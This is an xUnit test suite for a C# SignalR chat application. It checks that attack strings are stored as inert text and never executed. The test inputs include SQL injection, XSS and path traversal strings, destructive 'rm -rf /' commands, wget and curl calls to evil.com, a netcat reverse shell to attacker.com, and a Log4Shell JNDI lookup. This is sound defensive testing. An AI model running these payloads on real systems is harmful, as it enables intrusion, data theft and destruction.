using Xunit;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Configuration;
using Microsoft.AspNetCore.SignalR;
using Microsoft.AspNetCore.SignalR.Client;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.TestHost;
using System.Text;
using System.Text.Json;
using ChatApp.Services;
using ChatApp.Models;
using ChatApp.Hubs;
using Microsoft.Data.Sqlite;
using Dapper;
using System.Security.Claims;
using Microsoft.AspNetCore.Http;
using System.ComponentModel.DataAnnotations;

namespace ChatApp.Tests {
    /// <summary>
    /// Comprehensive Security Test Suite for ChatApp
    /// Tests for: SQL Injection, XSS, Command Injection, Buffer Overflow, 
    /// Session Hijacking, Rate Limiting, Data Integrity, Unicode Handling
    /// </summary>
    public class SecurityTestFixture : IDisposable {
        public IServiceProvider ServiceProvider { get; }
        public TestServer Server { get; }
        public HttpClient Client { get; }
        
        public SecurityTestFixture() {
            var builder = new WebHostBuilder()
                .UseEnvironment("Testing")
                .ConfigureServices(services => {
                    services.AddLogging();
                    services.AddSignalR();
                    
                    // Use in-memory SQLite for testing
                    var config = new ConfigurationBuilder()
                        .AddInMemoryCollection(new Dictionary<string, string?> {
                            {"ConnectionStrings:DefaultConnection", ":memory:"}
                        })
                        .Build();
                    
                    services.AddSingleton<IConfiguration>(config);
                    services.AddScoped<IMessageRepository, SqliteMessageRepository>();
                    services.AddScoped<IChatService, ChatService>();
                })
                .Configure(app => {
                    app.UseRouting();
                    app.UseEndpoints(endpoints => {
                        endpoints.MapHub<ChatHub>("/chathub");
                    });
                });
                
            Server = new TestServer(builder);
            Client = Server.CreateClient();
            ServiceProvider = Server.Services;
        }
        
        public void Dispose() {
            Client?.Dispose();
            Server?.Dispose();
        }
    }

    public class SecurityTests : IClassFixture<SecurityTestFixture> {
        private readonly SecurityTestFixture _fixture;
        private readonly IServiceScope _scope;
        private readonly IMessageRepository _repository;
        private readonly IChatService _chatService;
        private readonly ILogger<SecurityTests> _logger;

        public SecurityTests(SecurityTestFixture fixture) {
            _fixture = fixture;
            _scope = _fixture.ServiceProvider.CreateScope();
            _repository = _scope.ServiceProvider.GetRequiredService<IMessageRepository>();
            _chatService = _scope.ServiceProvider.GetRequiredService<IChatService>();
            _logger = _scope.ServiceProvider.GetRequiredService<ILogger<SecurityTests>>();
            
            // Initialize database for each test
            _repository.InitializeDatabaseAsync().Wait();
        }

        // ==================== SQL INJECTION TESTS ====================
        
        [Theory]
        [InlineData("'; DROP TABLE Messages; --")]
        [InlineData("' OR '1'='1")]
        [InlineData("'; DELETE FROM Messages WHERE '1'='1'; --")]
        [InlineData("' UNION SELECT * FROM Messages --")]
        [InlineData("'; INSERT INTO Messages VALUES ('hacker', 'owned', 'general', datetime('now')); --")]
        [InlineData("admin'/**/OR/**/1=1--")]
        [InlineData("'; EXEC xp_cmdshell('dir'); --")]
        [InlineData("1' AND (SELECT COUNT(*) FROM Messages) > 0 --")]
        public async Task SqlInjection_MessageRepository_SaveMessage_ShouldNotExecuteMaliciousSQL(string maliciousInput) {
            // Arrange
            var message = new ChatMessage {
                User = maliciousInput,
                Message = maliciousInput,
                Room = maliciousInput,
                Timestamp = DateTime.UtcNow
            };

            // Act & Assert - Should not throw and should save safely
            var messageId = await _repository.SaveMessageAsync(message);
            Assert.True(messageId > 0);
            
            // Verify the malicious SQL wasn't executed by checking if record exists with exact content
            var savedMessages = await _repository.GetRecentMessagesAsync(maliciousInput, 10);
            Assert.Single(savedMessages);
            Assert.Equal(maliciousInput, savedMessages[0].User);
            Assert.Equal(maliciousInput, savedMessages[0].Message);
        }

        [Theory]
        [InlineData("'; DROP TABLE Messages; --")]
        [InlineData("' OR '1'='1")]
        [InlineData("' UNION SELECT password FROM users --")]
        [InlineData("room'; SELECT * FROM Messages WHERE room='admin")]
        [InlineData("general' OR 1=1 --")]
        public async Task SqlInjection_MessageRepository_GetRecentMessages_ShouldNotExecuteMaliciousSQL(string maliciousRoomName) {
            // Arrange - Add a normal message first
            await _repository.SaveMessageAsync(new ChatMessage {
                User = "testuser",
                Message = "normal message",
                Room = "normalroom",
                Timestamp = DateTime.UtcNow
            });

            // Act - Try to retrieve with malicious room name
            var messages = await _repository.GetRecentMessagesAsync(maliciousRoomName, 10);
            
            // Assert - Should return empty list, not execute malicious SQL
            Assert.Empty(messages);
        }

        [Theory]
        [InlineData("'; DROP TABLE Messages; --")]
        [InlineData("' OR '1'='1")]
        [InlineData("admin' OR '1'='1' --")]
        [InlineData("user'; SELECT * FROM Messages --")]
        [InlineData("normaluser' UNION SELECT 'hacker', 'message', 'room', datetime('now') --")]
        public async Task SqlInjection_MessageRepository_GetMessagesByUser_ShouldNotExecuteMaliciousSQL(string maliciousUsername) {
            // Arrange - Add a normal message first
            await _repository.SaveMessageAsync(new ChatMessage {
                User = "normaluser",
                Message = "normal message",
                Room = "general",
                Timestamp = DateTime.UtcNow
            });

            // Act
            var messages = await _repository.GetMessagesByUserAsync(maliciousUsername, 10);
            
            // Assert - Should not return all messages or execute malicious SQL
            Assert.Empty(messages);
        }

        [Theory]
        [InlineData("'; DROP TABLE Messages; --", "general")]
        [InlineData("' OR '1'='1", "general")]
        [InlineData("test", "'; DROP TABLE Messages; --")]
        [InlineData("test' OR 1=1 --", "general")]
        [InlineData("'; UPDATE Messages SET Message='hacked' --", "general")]
        public async Task SqlInjection_MessageRepository_SearchMessages_ShouldNotExecuteMaliciousSQL(string searchTerm, string roomName) {
            // Arrange
            await _repository.SaveMessageAsync(new ChatMessage {
                User = "testuser",
                Message = "normal message",
                Room = "general",
                Timestamp = DateTime.UtcNow
            });

            // Act
            var messages = await _repository.SearchMessagesAsync(roomName, searchTerm, 10);
            
            // Assert - Should handle malicious input safely
            Assert.NotNull(messages);
        }

        // ==================== XSS/SCRIPT INJECTION TESTS ====================

        [Theory]
        [InlineData("<script>alert('XSS')</script>")]
        [InlineData("<img src=x onerror=alert('XSS')>")]
        [InlineData("javascript:alert('XSS')")]
        [InlineData("<iframe src=\"javascript:alert('XSS')\"></iframe>")]
        [InlineData("<svg onload=alert('XSS')>")]
        [InlineData("';alert('XSS');//")]
        [InlineData("<script>document.cookie</script>")]
        [InlineData("<script>window.location='http://evil.com'</script>")]
        [InlineData("<object data=\"javascript:alert('XSS')\">")]
        [InlineData("<embed src=\"javascript:alert('XSS')\">")]
        [InlineData("<link rel=stylesheet href=\"javascript:alert('XSS')\">")]
        [InlineData("<meta http-equiv=\"refresh\" content=\"0;javascript:alert('XSS')\">")]
        [InlineData("<body onload=\"alert('XSS')\">")]
        [InlineData("<div onmouseover=\"alert('XSS')\">")]
        public async Task XssInjection_MessageContent_ShouldBeStoredAsIs_NotExecuted(string maliciousScript) {
            // Arrange
            var message = new ChatMessage {
                User = "testuser",
                Message = maliciousScript,
                Room = "general",
                Timestamp = DateTime.UtcNow
            };

            // Act
            var messageId = await _repository.SaveMessageAsync(message);
            var savedMessages = await _repository.GetRecentMessagesAsync("general", 1);

            // Assert - Script should be stored as plain text, not executed
            Assert.True(messageId > 0);
            Assert.Single(savedMessages);
            Assert.Equal(maliciousScript, savedMessages[0].Message);
        }

        [Theory]
        [InlineData("<script>alert('XSS')</script>")]
        [InlineData("<img src=x onerror=alert('XSS')>")]
        [InlineData("javascript:alert('XSS')")]
        [InlineData("<svg/onload=alert('XSS')>")]
        [InlineData("&lt;script&gt;alert('XSS')&lt;/script&gt;")]
        public async Task XssInjection_Username_ShouldBeStoredAsIs_NotExecuted(string maliciousUsername) {
            // Arrange
            var message = new ChatMessage {
                User = maliciousUsername,
                Message = "normal message",
                Room = "general",
                Timestamp = DateTime.UtcNow
            };

            // Act
            var messageId = await _repository.SaveMessageAsync(message);
            var savedMessages = await _repository.GetMessagesByUserAsync(maliciousUsername, 1);

            // Assert
            Assert.True(messageId > 0);
            Assert.Single(savedMessages);
            Assert.Equal(maliciousUsername, savedMessages[0].User);
        }

        [Theory]
        [InlineData("<script>alert('XSS')</script>")]
        [InlineData("<iframe src=\"javascript:alert('XSS')\"></iframe>")]
        [InlineData("javascript:void(0)")]
        [InlineData("data:text/html,<script>alert('XSS')</script>")]
        public async Task XssInjection_RoomName_ShouldBeStoredAsIs_NotExecuted(string maliciousRoomName) {
            // Arrange
            var message = new ChatMessage {
                User = "testuser",
                Message = "normal message",
                Room = maliciousRoomName,
                Timestamp = DateTime.UtcNow
            };

            // Act
            var messageId = await _repository.SaveMessageAsync(message);
            var savedMessages = await _repository.GetRecentMessagesAsync(maliciousRoomName, 1);

            // Assert
            Assert.True(messageId > 0);
            Assert.Single(savedMessages);
            Assert.Equal(maliciousRoomName, savedMessages[0].Room);
        }

        // ==================== COMMAND INJECTION TESTS ====================

        [Theory]
        [InlineData("test; rm -rf /")]
        [InlineData("test && del /f /s /q C:\\*")]
        [InlineData("test | format c:")]
        [InlineData("test; shutdown -h now")]
        [InlineData("test`rm -rf /`")]
        [InlineData("test$(rm -rf /)")]
        [InlineData("test; cat /etc/passwd")]
        [InlineData("test; type C:\\Windows\\System32\\config\\SAM")]
        [InlineData("test; wget http://evil.com/malware")]
        [InlineData("test; curl -X POST http://evil.com/data")]
        [InlineData("test; powershell -c \"Get-Process\"")]
        [InlineData("test; bash -c \"ls -la\"")]
        [InlineData("test; nc -e /bin/sh attacker.com 4444")]
        [InlineData("test; python -c \"import os; os.system('ls')\"")]
        public async Task CommandInjection_MessageContent_ShouldNotExecuteSystemCommands(string commandInjection) {
            // Arrange
            var message = new ChatMessage {
                User = "testuser",
                Message = commandInjection,
                Room = "general",
                Timestamp = DateTime.UtcNow
            };

            // Act & Assert - Should complete without executing system commands
            var messageId = await _repository.SaveMessageAsync(message);
            Assert.True(messageId > 0);
            
            // Verify message is stored as-is
            var savedMessages = await _repository.GetRecentMessagesAsync("general", 1);
            Assert.Equal(commandInjection, savedMessages[0].Message);
        }

        // ==================== PATH TRAVERSAL TESTS ====================

        [Theory]
        [InlineData("../../../etc/passwd")]
        [InlineData("..\\..\\..\\Windows\\System32\\config\\SAM")]
        [InlineData("....//....//....//etc//passwd")]
        [InlineData("..%2F..%2F..%2Fetc%2Fpasswd")]
        [InlineData("..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam")]
        [InlineData("file:///etc/passwd")]
        [InlineData("file:///C:/Windows/System32/config/SAM")]
        public async Task PathTraversal_MessageContent_ShouldNotAccessFileSystem(string pathTraversal) {
            // Arrange
            var message = new ChatMessage {
                User = "testuser",
                Message = pathTraversal,
                Room = "general",
                Timestamp = DateTime.UtcNow
            };

            // Act & Assert - Should store as plain text, not access files
            var messageId = await _repository.SaveMessageAsync(message);
            Assert.True(messageId > 0);
            
            var savedMessages = await _repository.GetRecentMessagesAsync("general", 1);
            Assert.Equal(pathTraversal, savedMessages[0].Message);
        }

        // ==================== INPUT VALIDATION TESTS ====================

        [Fact]
        public async Task InputValidation_NullUsername_ShouldThrowValidationException() {
            // Arrange
            var message = new ChatMessage {
                User = null!,
                Message = "test message",
                Room = "general",
                Timestamp = DateTime.UtcNow
            };

            // Act & Assert
            await Assert.ThrowsAnyAsync<Exception>(() => _repository.SaveMessageAsync(message));
        }

        [Fact]
        public async Task InputValidation_EmptyUsername_ShouldHandleGracefully() {
            // Arrange
            var message = new ChatMessage {
                User = "",
                Message = "test message",
                Room = "general",
                Timestamp = DateTime.UtcNow
            };

            // Act & Assert - Should handle gracefully
            try {
                await _repository.SaveMessageAsync(message);
            } catch (Exception ex) {
                // Should be a validation exception, not a system crash
                Assert.True(ex is ArgumentException || ex is ValidationException || ex is SqliteException);
            }
        }

        [Theory]
        [InlineData(null)]
        [InlineData("")]
        public async Task InputValidation_NullOrEmptyMessage_ShouldHandleGracefully(string? messageContent) {
            // Arrange
            var message = new ChatMessage {
                User = "testuser",
                Message = messageContent!,
                Room = "general",
                Timestamp = DateTime.UtcNow
            };

            // Act & Assert
            if (messageContent == null) {
                await Assert.ThrowsAnyAsync<Exception>(() => _repository.SaveMessageAsync(message));
            } else {
                // Empty message might be allowed - test it doesn't crash
                try {
                    await _repository.SaveMessageAsync(message);
                } catch (Exception ex) {
                    Assert.True(ex is ArgumentException || ex is ValidationException || ex is SqliteException);
                }
            }
        }

        // ==================== BUFFER OVERFLOW TESTS ====================

        [Theory]
        [InlineData(1000)]
        [InlineData(10000)]
        [InlineData(100000)]
        public async Task BufferOverflow_LargeInputs_ShouldHandleGracefully(int size) {
            // Arrange
            var largeInput = new string('X', size);
            var message = new ChatMessage {
                User = size > 1000 ? largeInput.Substring(0, 1000) : largeInput, // Limit username
                Message = largeInput,
                Room = "test",
                Timestamp = DateTime.UtcNow
            };

            // Act & Assert
            try {
                await _repository.SaveMessageAsync(message);
            } catch (Exception ex) {
                // Should handle large inputs gracefully
                Assert.True(ex is ArgumentException || ex is ValidationException || ex is SqliteException);
            }
        }

        // ==================== UNICODE AND ENCODING TESTS ====================

        [Theory]
        [InlineData("🚀🎉💻")] // Emojis
        [InlineData("测试中文")] // Chinese characters
        [InlineData("テスト")] // Japanese characters
        [InlineData("العربية")] // Arabic
        [InlineData("русский")] // Cyrillic
        [InlineData("हिंदी")] // Hindi
        [InlineData("🔥💀👻🎭🎪")] // Multiple emojis
        [InlineData("\\x00\\x01\\x02")] // Escaped control chars
        [InlineData("\\u0000\\u0001\\u0002")] // Unicode escape sequences
        public async Task UnicodeHandling_VariousEncodings_ShouldHandleCorrectly(string unicodeInput) {
            // Arrange
            var message = new ChatMessage {
                User = "testuser",
                Message = unicodeInput,
                Room = "general",
                Timestamp = DateTime.UtcNow
            };

            // Act
            var messageId = await _repository.SaveMessageAsync(message);
            var savedMessages = await _repository.GetRecentMessagesAsync("general", 1);

            // Assert
            Assert.True(messageId > 0);
            Assert.Single(savedMessages);
        }

        // ==================== RATE LIMITING SIMULATION ====================

        [Fact]
        public async Task RateLimiting_MassiveMessageVolume_ShouldHandleGracefully() {
            // Arrange
            var tasks = new List<Task<int>>();
            var messageCount = 100; // Reduced for test performance

            // Act - Simulate rapid message sending
            for (int i = 0; i < messageCount; i++) {
                var message = new ChatMessage {
                    User = $"user{i % 10}",
                    Message = $"Message {i}",
                    Room = "stress_test",
                    Timestamp = DateTime.UtcNow.AddMilliseconds(i)
                };
                
                tasks.Add(_repository.SaveMessageAsync(message));
            }

            // Assert - Should handle concurrent operations
            var results = await Task.WhenAll(tasks);
            Assert.All(results, id => Assert.True(id > 0));
        }

        // ==================== SESSION/CONNECTION SECURITY TESTS ====================

        [Fact]
        public async Task SessionSecurity_SimulateConnectionHijack_ShouldHandleGracefully() {
            // Test that multiple connections don't interfere
            var service1 = _scope.ServiceProvider.GetRequiredService<IChatService>();
            var service2 = _scope.ServiceProvider.GetRequiredService<IChatService>();

            await service1.ReserveUsernameAsync("conn1", "user1");
            await service2.ReserveUsernameAsync("conn2", "user2");

            var rooms1 = service1.GetAvailableRooms();
            var rooms2 = service2.GetAvailableRooms();

            // Services should operate independently
            Assert.NotNull(rooms1);
            Assert.NotNull(rooms2);
        }

        // ==================== DATA INTEGRITY TESTS ====================

        [Fact]
        public async Task DataIntegrity_ConcurrentWrites_ShouldMaintainConsistency() {
            // Arrange
            var room = "integrity_test";
            var userCount = 10; // Reduced for test performance
            var messagesPerUser = 5;
            var tasks = new List<Task<int>>();

            // Act - Multiple users sending messages concurrently
            for (int u = 0; u < userCount; u++) {
                var user = $"user{u}";
                for (int m = 0; m < messagesPerUser; m++) {
                    var message = new ChatMessage {
                        User = user,
                        Message = $"Message {m} from {user}",
                        Room = room,
                        Timestamp = DateTime.UtcNow.AddMilliseconds(u * messagesPerUser + m)
                    };
                    
                    tasks.Add(_repository.SaveMessageAsync(message));
                }
            }

            var results = await Task.WhenAll(tasks);

            // Assert - All messages should be saved
            Assert.All(results, id => Assert.True(id > 0));
            var allMessages = await _repository.GetRecentMessagesAsync(room, userCount * messagesPerUser);
            Assert.Equal(userCount * messagesPerUser, allMessages.Count);
        }

        // ==================== BOUNDARY VALUE TESTS ====================

        [Theory]
        [InlineData(int.MinValue)]
        [InlineData(int.MaxValue)]
        [InlineData(0)]
        [InlineData(-1)]
        public async Task BoundaryValues_MessageCount_ShouldHandleExtremeValues(int count) {
            // Arrange
            await _repository.SaveMessageAsync(new ChatMessage {
                User = "testuser",
                Message = "test",
                Room = "boundary_test",
                Timestamp = DateTime.UtcNow
            });

            // Act & Assert
            try {
                var messages = await _repository.GetRecentMessagesAsync("boundary_test", count);
                Assert.NotNull(messages);
                
                if (count <= 0) {
                    Assert.Empty(messages);
                } else {
                    Assert.True(messages.Count <= Math.Min(count, 1));
                }
            } catch (ArgumentException) {
                // Acceptable to throw ArgumentException for invalid counts
            }
        }

        // ==================== SERIALIZATION SECURITY TESTS ====================

        [Theory]
        [InlineData("{\"__type\":\"System.Windows.Data.ObjectDataProvider\"}")]
        [InlineData("<serialization><object type=\"System.Diagnostics.Process\"/>")]
        [InlineData("eval(alert('XSS'))")]
        [InlineData("${jndi:ldap://evil.com/a}")]
        [InlineData("@{7*7}")]
        public async Task SerializationSecurity_MaliciousPayloads_ShouldNotDeserializeUnsafely(string maliciousPayload) {
            // Arrange
            var message = new ChatMessage {
                User = "testuser",
                Message = maliciousPayload,
                Room = "general",
                Timestamp = DateTime.UtcNow
            };

            // Act & Assert - Should treat as plain text
            var messageId = await _repository.SaveMessageAsync(message);
            Assert.True(messageId > 0);
            
            var savedMessages = await _repository.GetRecentMessagesAsync("general", 1);
            Assert.Equal(maliciousPayload, savedMessages[0].Message);
        }

        // ==================== LDAP INJECTION TESTS ====================

        [Theory]
        [InlineData("*)(objectClass=*)")]
        [InlineData("*)(uid=*))(|(uid=*")]
        [InlineData("admin*")]
        [InlineData("*)(|(password=*)")]
        [InlineData(")(cn=*))(|(cn=*")]
        public async Task LdapInjection_UsernameFields_ShouldNotExecuteLdapQueries(string ldapInjection) {
            // Even though we don't use LDAP, test that these patterns are stored safely
            var message = new ChatMessage {
                User = ldapInjection,
                Message = "test message",
                Room = "general",
                Timestamp = DateTime.UtcNow
            };

            var messageId = await _repository.SaveMessageAsync(message);
            Assert.True(messageId > 0);
            
            var savedMessages = await _repository.GetMessagesByUserAsync(ldapInjection, 1);
            Assert.Single(savedMessages);
            Assert.Equal(ldapInjection, savedMessages[0].User);
        }

        // ==================== NULL BYTE INJECTION TESTS ====================

        [Theory]
        [InlineData("test\0.txt")]
        [InlineData("normal\0<script>alert('xss')</script>")]
        [InlineData("user\0admin")]
        [InlineData("message\0; DROP TABLE Messages; --")]
        public async Task NullByteInjection_InputFields_ShouldHandleNullBytes(string nullByteInput) {
            var message = new ChatMessage {
                User = "testuser",
                Message = nullByteInput,
                Room = "general",
                Timestamp = DateTime.UtcNow
            };

            var messageId = await _repository.SaveMessageAsync(message);
            Assert.True(messageId > 0);
            
            var savedMessages = await _repository.GetRecentMessagesAsync("general", 1);
            Assert.Single(savedMessages);
        }

        // ==================== NOSQL INJECTION TESTS ====================

        [Theory]
        [InlineData("'; return db.messages.drop(); //")]
        [InlineData("$where: 'this.user == \"admin\"'")]
        [InlineData("{$ne: null}")]
        [InlineData("'; db.messages.find(); //")]
        public async Task NoSqlInjection_ShouldNotExecuteNoSqlCommands(string noSqlInjection) {
            // Test NoSQL injection patterns even though we use SQLite
            var message = new ChatMessage {
                User = "testuser",
                Message = noSqlInjection,
                Room = "general",
                Timestamp = DateTime.UtcNow
            };

            var messageId = await _repository.SaveMessageAsync(message);
            Assert.True(messageId > 0);
            
            var savedMessages = await _repository.GetRecentMessagesAsync("general", 1);
            Assert.Equal(noSqlInjection, savedMessages[0].Message);
        }

        // ==================== CLEANUP ====================

        public void Dispose() {
            _scope?.Dispose();
        }
    }

    // ==================== SIGNALR HUB SECURITY TESTS ====================

    public class SignalRSecurityTests : IClassFixture<SecurityTestFixture> {
        private readonly SecurityTestFixture _fixture;

        public SignalRSecurityTests(SecurityTestFixture fixture) {
            _fixture = fixture;
        }

        [Fact]
        public async Task SignalRSecurity_MultipleConnections_ShouldIsolateUsers() {
            // Arrange
            var connection1 = new HubConnectionBuilder()
                .WithUrl($"{_fixture.Server.BaseAddress}chathub", options => {
                    options.HttpMessageHandlerFactory = _ => _fixture.Server.CreateHandler();
                })
                .Build();

            var connection2 = new HubConnectionBuilder()
                .WithUrl($"{_fixture.Server.BaseAddress}chathub", options => {
                    options.HttpMessageHandlerFactory = _ => _fixture.Server.CreateHandler();
                })
                .Build();

            try {
                // Act
                await connection1.StartAsync();
                await connection2.StartAsync();

                // Assert - Connections should be independent
                Assert.Equal(HubConnectionState.Connected, connection1.State);
                Assert.Equal(HubConnectionState.Connected, connection2.State);
                Assert.NotEqual(connection1.ConnectionId, connection2.ConnectionId);
            } finally {
                await connection1.DisposeAsync();
                await connection2.DisposeAsync();
            }
        }

        [Theory]
        [InlineData("<script>alert('XSS')</script>")]
        [InlineData("'; DROP TABLE Messages; --")]
        [InlineData("../../etc/passwd")]
        [InlineData("admin'; --")]
        [InlineData("$(rm -rf /)")]
        public async Task SignalRSecurity_MaliciousUsernames_ShouldHandleSecurely(string maliciousUsername) {
            // Arrange
            var connection = new HubConnectionBuilder()
                .WithUrl($"{_fixture.Server.BaseAddress}chathub", options => {
                    options.HttpMessageHandlerFactory = _ => _fixture.Server.CreateHandler();
                })
                .Build();

            try {
                await connection.StartAsync();

                // Act & Assert - Should handle malicious usernames without crashing
                try {
                    await connection.InvokeAsync("ReserveUsername", maliciousUsername);
                } catch (Exception ex) {
                    // Should be a validation error, not a system crash
                    Assert.True(ex is HubException || ex is TimeoutException);
                }
            } finally {
                await connection.DisposeAsync();
            }
        }

        [Fact]
        public async Task SignalRSecurity_ConnectionFlood_ShouldHandleGracefully() {
            // Test multiple rapid connections
            var connections = new List<HubConnection>();
            var tasks = new List<Task>();

            try {
                for (int i = 0; i < 50; i++) {
                    var connection = new HubConnectionBuilder()
                        .WithUrl($"{_fixture.Server.BaseAddress}chathub", options => {
                            options.HttpMessageHandlerFactory = _ => _fixture.Server.CreateHandler();
                        })
                        .Build();
                    
                    connections.Add(connection);
                    tasks.Add(connection.StartAsync());
                }

                // Should handle all connections without crashing
                await Task.WhenAll(tasks);
                
                // Verify connections are established
                Assert.All(connections, conn => Assert.Equal(HubConnectionState.Connected, conn.State));
            } finally {
                foreach (var connection in connections) {
                    await connection.DisposeAsync();
                }
            }
        }
    }

    // ==================== INTEGRATION SECURITY TESTS ====================

    public class IntegrationSecurityTests : IClassFixture<SecurityTestFixture> {
        private readonly SecurityTestFixture _fixture;

        public IntegrationSecurityTests(SecurityTestFixture fixture) {
            _fixture = fixture;
        }

        [Fact]
        public async Task Integration_EndToEndSecurityFlow_ShouldHandleMaliciousPayload() {
            // Arrange
            var connection = new HubConnectionBuilder()
                .WithUrl($"{_fixture.Server.BaseAddress}chathub", options => {
                    options.HttpMessageHandlerFactory = _ => _fixture.Server.CreateHandler();
                })
                .Build();

            var maliciousPayloads = new[] {
                "<script>alert('XSS')</script>",
                "'; DROP TABLE Messages; --",
                "$(rm -rf /)",
                "javascript:alert(document.cookie)",
                new string('A', 1000), // Large payload
                "../../../etc/passwd",
                "${jndi:ldap://evil.com/a}"
            };

            try {
                await connection.StartAsync();

                foreach (var payload in maliciousPayloads) {
                    // Act - Try to send malicious content through the full flow
                    try {
                        await connection.InvokeAsync("ReserveUsername", $"user_{Guid.NewGuid():N}");
                        await connection.InvokeAsync("JoinRoom", "test_room");
                        await connection.InvokeAsync("SendMessage", payload);
                    } catch (Exception ex) {
                        // Should handle malicious content gracefully
                        Assert.True(ex is HubException || ex is TimeoutException || ex is InvalidOperationException);
                    }
                }
            } finally {
                await connection.DisposeAsync();
            }
        }

        [Fact]
        public async Task Integration_DatabaseSecurity_ShouldPreventDirectAccess() {
            // This test ensures that even if someone gets access to connection string,
            // they can't easily compromise the system
            
            var scope = _fixture.ServiceProvider.CreateScope();
            var config = scope.ServiceProvider.GetRequiredService<IConfiguration>();
            var connectionString = config.GetConnectionString("DefaultConnection");
            
            // Verify connection string doesn't contain sensitive information
            Assert.DoesNotContain("password", connectionString?.ToLower() ?? "");
            Assert.DoesNotContain("pwd", connectionString?.ToLower() ?? "");
            Assert.DoesNotContain("secret", connectionString?.ToLower() ?? "");
            Assert.DoesNotContain("admin", connectionString?.ToLower() ?? "");
        }

        [Fact]
        public async Task Integration_ConcurrentSecurityScenarios_ShouldHandleGracefully() {
            // Simulate multiple attack vectors simultaneously
            var tasks = new List<Task>();
            var connectionCount = 10;

            for (int i = 0; i < connectionCount; i++) {
                tasks.Add(SimulateAttackScenario(i));
            }

            // Should not crash or hang
            await Task.WhenAll(tasks);
        }

        private async Task SimulateAttackScenario(int scenarioId) {
            var connection = new HubConnectionBuilder()
                .WithUrl($"{_fixture.Server.BaseAddress}chathub", options => {
                    options.HttpMessageHandlerFactory = _ => _fixture.Server.CreateHandler();
                })
                .Build();

            try {
                await connection.StartAsync();
                
                var attacks = new[] {
                    "<script>alert('XSS')</script>",
                    "'; DROP TABLE Messages; --",
                    "$(rm -rf /)",
                    new string('A', 10000),
                    "../../../etc/passwd",
                    "${jndi:ldap://evil.com/a}",
                    "javascript:void(document.cookie='stolen')"
                };

                var attack = attacks[scenarioId % attacks.Length];
                
                await connection.InvokeAsync("ReserveUsername", $"attacker{scenarioId}");
                await connection.InvokeAsync("JoinRoom", "target_room");
                await connection.InvokeAsync("SendMessage", attack);
            } catch {
                // Expected - attacks should be blocked or handled gracefully
            } finally {
                await connection.DisposeAsync();
            }
        }

        [Fact]
        public async Task Integration_MemoryExhaustion_ShouldNotCrashServer() {
            // Test that large payloads don't exhaust server memory
            var connection = new HubConnectionBuilder()
                .WithUrl($"{_fixture.Server.BaseAddress}chathub", options => {
                    options.HttpMessageHandlerFactory = _ => _fixture.Server.CreateHandler();
                })
                .Build();

            try {
                await connection.StartAsync();
                
                // Try to send multiple large messages
                for (int i = 0; i < 10; i++) {
                    try {
                        var largeMessage = new string('X', 1024 * 100); // 100KB message
                        await connection.InvokeAsync("ReserveUsername", $"user{i}");
                        await connection.InvokeAsync("JoinRoom", "memory_test");
                        await connection.InvokeAsync("SendMessage", largeMessage);
                    } catch {
                        // Expected - large messages should be rejected
                    }
                }
            } finally {
                await connection.DisposeAsync();
            }
        }
    }
} 